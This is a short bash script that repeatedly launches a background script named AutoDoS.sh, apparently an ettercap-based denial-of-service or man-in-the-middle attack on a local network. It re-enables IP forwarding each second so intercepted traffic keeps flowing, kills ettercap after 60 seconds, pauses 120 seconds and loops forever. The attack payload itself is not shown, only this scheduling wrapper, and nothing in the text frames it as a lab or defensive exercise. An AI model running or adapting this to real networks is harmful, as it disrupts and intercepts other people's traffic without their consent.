#!/bin/bash
counter()
{
    for i in $( seq $1 -1 1 )
    do
        echo "[+] $i second(s) left"
        echo "1" > /proc/sys/net/ipv4/ip_forward #ettercap would shutdown ip_forward
        sleep 1
    done
}
while :
do
    /root/codes/DoS/G313/AutoDoS.sh &
    counter 60
    killall ettercap
    counter 120
done
